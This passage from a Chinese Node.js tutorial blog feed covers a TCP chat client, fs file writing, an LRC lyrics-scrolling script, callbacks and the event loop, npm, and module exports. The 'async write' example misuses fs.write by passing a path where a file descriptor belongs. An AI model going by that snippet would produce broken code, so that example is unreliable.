spellcheck="true">//通过当前进程的标准输入的data事件获取终端的输入</span>    process<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>        data <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        client<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>client<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//打开多个客户端，即可互相发送消息</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Node.js文件操作</title>
      <link href="2019/05/04/Node.js-Node.js%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
      <url>2019/05/04/Node.js-Node.js%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>Node.js的文件操作API由fs（File System）模块提供，该模块提供的函数均有异步和同步版本，例如读取文件内容的函数有异步的fs.readFile()和同步的fs.readFileSync()。实际开发中建议大家使用异步函数，性能更高，速度更快，而且没有阻塞。</p><h2 id="同步文件写入"><a href="#同步文件写入" class="headerlink" title="同步文件写入"></a>同步文件写入</h2><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//同步API必须使用try...catch来捕获异常</span><span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'写入文件...'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">'路径'</span><span class="token punctuation">,</span><span class="token string">'内容'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'不好意思，文件写入失败了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><a id="more"></a><h2 id="异步文件写入"><a href="#异步文件写入" class="headerlink" title="异步文件写入"></a>异步文件写入</h2><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//异步文件写入函数多了一个回调函数</span><span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//该方法中回调函数的第一个参数为错误对象</span>fs<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'路径'</span><span class="token punctuation">,</span><span class="token string">'内容'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'不好意思，文件写入失败了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出132</span></code></pre><p>其他的一些文件操作在此就不细写了，上网随时可查，下面做一个实际例子。</p><h2 id="控制歌词滚动"><a href="#控制歌词滚动" class="headerlink" title="控制歌词滚动"></a>控制歌词滚动</h2><p>歌词格式</p><blockquote><p>[ti:自由(Live)]<br>[ar:梁咏琪]<br>[al:蒙面歌王第八期]<br>[by:果果1314]<br>[00:00.00]梁咏琪 - 自由(Live)<br>[00:03.00]歌词编辑：果果<br>[00:06.00]QQ:765708831<br>[00:09.00]Lrc歌词网：<a href="http://www.90lrc.cn" target="_blank" rel="noopener">www.90lrc.cn</a><br>[00:12.00]<br>[00:16.65]也许会恨你<br>[00:18.66]我知道我的脾气不是很好</p></blockquote><p>歌词随时间逐句输出</p><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'./lrc.txt'</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'读取歌词文件失败了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    data <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> lines <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//正则匹配，解析出毫秒</span>    <span class="token comment" spellcheck="true">//需要里面的时间和里面的内容</span>    <span class="token keyword">let</span> reg <span class="token operator">=</span> <span class="token regex">/\[(\d{2})\:(\d{2})\.(\d{2})\]\s*(.+)/</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> lines<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//自执行函数</span>        <span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">let</span> line <span class="token operator">=</span> lines<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">let</span> matches <span class="token operator">=</span> reg<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>matches<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">let</span> m <span class="token operator">=</span> <span class="token function">parseFloat</span><span class="token punctuation">(</span>matches<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">let</span> s <span class="token operator">=</span> <span class="token function">parseFloat</span><span class="token punctuation">(</span>matches<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">let</span> ms <span class="token operator">=</span> <span class="token function">parseFloat</span><span class="token punctuation">(</span>matches<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">let</span> content <span class="token operator">=</span> matches<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">let</span> time <span class="token operator">=</span> m<span class="token operator">*</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">1000</span> <span class="token operator">+</span> s<span class="token operator">*</span><span class="token number">1000</span> <span class="token operator">+</span>ms<span class="token punctuation">;</span>                <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Node.js异步资源和包资源管理</title>
      <link href="2019/05/03/Node.js-%E5%BC%82%E6%AD%A5%E8%B5%84%E6%BA%90%E5%92%8C%E5%8C%85%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86/"/>
      <url>2019/05/03/Node.js-%E5%BC%82%E6%AD%A5%E8%B5%84%E6%BA%90%E5%92%8C%E5%8C%85%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="异步编程"><a href="#异步编程" class="headerlink" title="异步编程"></a>异步编程</h1><p>JavaScript的执行环境是单线程的，单线程一次只能完成一个任务，如果有多个任务，就需要等待前面一个任务完成后，再执行后面的一个任务。常见的浏览器无响应就是某一段JS代码长时间运行造成的。</p><p>为解决单线程阻塞的问题，Node.js中加入了异步编程模块，保证了Node.js快速响应，充分利用CPU。</p><h2 id="同步和异步"><a href="#同步和异步" class="headerlink" title="同步和异步"></a>同步和异步</h2><ol><li>同步：代码按照顺序依次执行</li></ol><pre class=" language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'起床'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'背单词'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">eatBreakfast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'早餐吃完了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">eatBreakfast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'去上学'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ol start="2"><li>异步：</li></ol><pre class=" language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'起床'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'背单词'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">eatBreakfast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'开始吃早餐了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//setTimeout是一个异步函数，不会阻塞后面代码的继续执行</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'早餐吃完了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">eatBreakfast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'去上学'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//相当于边去学校，边吃早餐</span><span class="token comment" spellcheck="true">//输出：起床，背单词，开始吃早餐了，去上学，早餐吃完了</span></code></pre><h2 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h2><p>回调函数是指函数可以被传递到另一个函数中，然后被调用的形式，典型的应用就是异步函数的异常处理。</p><ol><li>同步代码中使用try…catch处理异常</li></ol><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//同步代码处理异常</span><span class="token keyword">function</span> <span class="token function">parseJsonStrToObj</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//用于从一个字符串中解析出json对象</span>    <span class="token keyword">return</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//对于同步代码，可以使用try...catch来捕获异常</span><span class="token keyword">try</span><span class="token punctuation">{</span>    <span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token function">parseJsonStrToObj</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'转换失败了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//输出：转换失败了</span></code></pre><ol start="2"><li>异步代码无法使用try…catch处理异常</li></ol><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//异步代码无法处理异常</span><span class="token keyword">function</span> <span class="token function">parseJsonStrToObj</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">try</span><span class="token punctuation">{</span>    <span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token function">parseJsonStrToObj</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'转换失败了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//最后会报错，说明异步代码无法处理异常</span></code></pre><ol start="3"><li>使用回调函数接收异步代码的执行结果</li></ol><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//try...catch写在异步代码中</span><span class="token keyword">function</span> <span class="token function">parseJsonStrToObj</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//有返回值，但是无法接收</span>        <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'转换失败了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token function">parseJsonStrToObj</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出：undefined 转换失败了</span></code></pre><p>根据此提出回调函数的设计，即当使用异步代码去做一件事时，不能预测这件事什么时候做完，其他的事情还在继续，这时可给异步代码准备一个包裹，当异步代码有了执行结果时，可以将结果放在这个包裹里，需要在哪里使用这个结果就从包裹取出。</p><p>回调函数设计的3个约定：</p><p>（1） 函数名通常为callback,在封装异步执行代码时，优先把callback作为函数最后一个参数出现</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">函数名</span><span class="token punctuation">(</span>arg1<span class="token punctuation">,</span>arg2<span class="token punctuation">,</span>callback<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span></code></pre><p>（2）把代码中出现的错误作为callback回调函数的第一个参数进行传递,返回结果作为第二个参数</p><pre class=" language-js"><code class="language-js"><span class="token function">callback</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>改写上面函数</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">parseJsonStrToObj</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span>callback<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>            <span class="token keyword">let</span> obj <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">callback</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">callback</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">parseJsonStrToObj</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span>result<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'转换失败了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'转换成功：'</span><span class="token operator">+</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//输出，转换失败了</span></code></pre><h2 id="事件驱动"><a href="#事件驱动" class="headerlink" title="事件驱动"></a>事件驱动</h2><p>当异步函数执行时，不确定何时执行完毕，回调函数会被压入到一个事件循环队列，然后往下执行其他代码，直到异步函数执行完成后，才会开始处理事件循环，调用相应的回调函数。事件循环队列为先进先出队列，按顺序执行。</p><h1 id="Node-js的包和NPM"><a href="#Node-js的包和NPM" class="headerlink" title="Node.js的包和NPM"></a>Node.js的包和NPM</h1><p>Node.js根据CommonJS规范实现了包机制，CommomJS API定义很多用于非浏览器的应该使用的普通应用程序，Node.js就是一个非浏览器的应用，CommonJS是一种规范，Node.js是这种规范的部分实现。</p><h2 id="包的概念"><a href="#包的概念" class="headerlink" title="包的概念"></a>包的概念</h2><p>包和模块没有本质的区别，包是在模块的基础上更进一步的组织JavaSript代码的目录。</p><p>包目录结构：</p><table><thead><tr><th>规范的包结构</th><th>作用</th></tr></thead><tbody><tr><td>package.json</td><td>顶层目录的包描述文件，说明文件（JSON字符串描述)</td></tr><tr><td>bin</td><td>可执行的二进制文件</td></tr><tr><td>lib</td><td>存放JS文件的目录</td></tr><tr><td>doc</td><td>文档</td></tr><tr><td>test</td><td>存放单元测试用例的代码</td></tr></tbody></table><h2 id="NPM的概念"><a href="#NPM的概念" class="headerlink" title="NPM的概念"></a>NPM的概念</h2><p>全称为Node.js Package Manage,有两种含义，一种是Node.js的开放模块登记和管理系统，是一个NPM网站:<code>www.npmjs.com</code>,里面所有的包都是通过Node.js实现的。</p><p>另一种含义是Node.js的包管理工具，命令行下的软件，比如，npm install 包名</p><p>NPM是随Node.js一同安装的。</p><h2 id="基本应用"><a href="#基本应用" class="headerlink" title="基本应用"></a>基本应用</h2><blockquote><p>npm install 包名</p></blockquote><p>安装后，Node.js会自动在项目当前根目录下创建一个目录，名为node_modules,然后把第三方包自动放在该目录下。node_modules就是专门用于放置第三方包的。</p><h2 id="包模块加载规则"><a href="#包模块加载规则" class="headerlink" title="包模块加载规则"></a>包模块加载规则</h2><p>（1）加载时，默认为核心模块，若不是，则会去node_modules目录下寻找。</p><p>（2）如果找到了，Node.js将会找到该目录下的package.json文件获取main属性值，根据main属性指定的路径值进行加载。</p>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>初识Node.js</title>
      <link href="2019/05/02/Node.js-%E5%88%9D%E8%AF%86Node.js/"/>
      <url>2019/05/02/Node.js-%E5%88%9D%E8%AF%86Node.js/</url>
      
        <content type="html"><![CDATA[<p>JavaScript在客户端与服务端实现的功能不同，区别具体如下：</p><p>​    在客户端，JavaScript需要依赖浏览器提供的JavaScript引擎解析执行，浏览器提供了对DOM的解析，客户端不仅要应用语法，而且要会操作DOM和BOM。</p><p>​    在服务器端，JavaScript不依赖浏览器，而是由特定的运行环境提供的JavaScript引擎解析执行，例如Node.js，只需应用语法，不需要操作DOM和BOM。</p><p>JavaScript包括ECMAScript,DOM,BOM三个部分，具体如下：</p><ol><li>ECMAScript是JavaScript的核心语法</li><li>DOM是HTML和XML的应用程序接口，用于控制文档的内容和结构。</li><li>BOM（浏览器对象模型）可以对浏览器窗口进行访问和操作。</li></ol><h2 id="1-Node-js的特点与优势"><a href="#1-Node-js的特点与优势" class="headerlink" title="1.Node.js的特点与优势"></a>1.Node.js的特点与优势</h2><ul><li>它是一个JavaScript运行环境，前后端语言一致。</li><li>依赖于Chrome v8引擎进行代码解析，这个引擎负责在非浏览器解析情况下解析代码</li><li>事件驱动（Event-Driven）</li><li>非阻塞I/O：服务器端会设计阻塞I/O的操作，Node.js使用事件回调的方式实现非阻塞I/O</li><li>轻量，可伸缩，适于实时数据交互应用</li><li>单进程，单线程：阻塞I/O一个线程只能处理一个任务，非阻塞I/O一个线程永远在处理任务，Node.js采用             单线程，利用事件驱动的异步编程模式，实现了非阻塞I/O。</li></ul><h2 id="2-第一个Node-js的web程序"><a href="#2-第一个Node-js的web程序" class="headerlink" title="2.第一个Node.js的web程序"></a>2.第一个Node.js的web程序</h2><p>命令行运行<code>node demo.js</code>,demo.js如下，打开浏览器输入127.0.0.1:3000,输出hello world</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//加载http模块</span><span class="token keyword">var</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创建http服务器</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//响应结束</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'hello world'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//监听网址127.0.0.1 端口号3000</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="3-REPL运行环境（Read-Eval-Print-Loop）"><a href="#3-REPL运行环境（Read-Eval-Print-Loop）" class="headerlink" title="3.REPL运行环境（Read-Eval-Print-Loop）"></a>3.REPL运行环境（Read-Eval-Print-Loop）</h2><p>打开终端，输入node即可进入REPL运行环境，可以解析JS代码，执行变量和函数的相关操作。</p><p>其实<strong>Chrome中的Console控制台就是REPL环境</strong>。</p><h2 id="4-global对象和模块作用域"><a href="#4-global对象和模块作用域" class="headerlink" title="4.global对象和模块作用域"></a>4.global对象和模块作用域</h2><p>在Node.js中，默认声明的变量，函数都是属于当前文件模块，都是私有的，只有在当前模块作用域内可以使用，如果想在全局范围内为某个变量赋值，可以应用 全局对象global.</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token string">'bar'</span><span class="token punctuation">;</span>global<span class="token punctuation">.</span>foo <span class="token operator">=</span> foo<span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'global:foo'</span><span class="token operator">+</span>global<span class="token punctuation">.</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="4-1-require-exports-module-exports"><a href="#4-1-require-exports-module-exports" class="headerlink" title="4.1 require(),exports,module.exports"></a>4.1 require(),exports,module.exports</h3><p>在一个文件模块中直接给某个全局变量赋值，显得很突兀，可能会污染命名空间，造成耦合的问题，为了解决上述问题，exports是模块公开的接口，require()用于从外部获取一个模块的接口。</p><p>info.js:</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//向外开放变量name</span>exports<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'itcast'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//向外开放变量age</span>module<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token string">'10'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//向外开放函数</span>module<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>sayHello <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>demo.js</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//加载模块</span><span class="token keyword">let</span> myModule <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./info'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>myModule<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出模块中的变量值</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'name:'</span><span class="token operator">+</span>myModule<span class="token 